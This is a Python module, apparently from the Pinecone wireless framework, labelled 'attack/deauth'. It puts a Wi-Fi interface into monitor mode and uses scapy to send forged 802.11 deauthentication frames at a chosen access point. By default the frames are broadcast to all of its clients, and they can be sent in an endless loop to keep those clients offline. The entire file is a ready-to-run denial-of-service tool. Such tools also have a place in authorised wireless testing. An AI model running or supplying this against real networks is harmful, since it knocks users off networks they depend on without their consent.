from pyric import pyw
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth, sendp

from pinecone.core.module import BaseModule
from pinecone.utils.interface import set_monitor_mode


class Module(BaseModule):
    meta = {
        "id": "attack/deauth",
        "name": "",
        "author": "",
        "version": "",
        "description": ""
    }

    @classmethod
    def set_run_parser(cls, run_parser):
        run_parser.add_argument("-i", "--iface", help="wlan interface", default="wlan0", type=str)
        run_parser.add_argument("-b", "--bssid", required=True, type=str)
        run_parser.add_argument("-c", "--channel", required=True, type=int)
        run_parser.add_argument("--client", default="FF:FF:FF:FF:FF:FF", type=str)
        run_parser.add_argument("-n", "--num-packets", default=10, type=int)

    def run(self, args):
        interface = set_monitor_mode(args.iface)
        pyw.chset(interface, args.channel)

        deauth_packet = RadioTap() / Dot11(addr1=args.client, addr2=args.bssid, addr3=args.bssid) / Dot11Deauth()
        i = args.num_packets if args.num_packets > 0 else -1

        while i != 0:
            sendp(deauth_packet, iface=args.iface)

            if i != -1:
                i -= 1

    def stop(self):
        pass
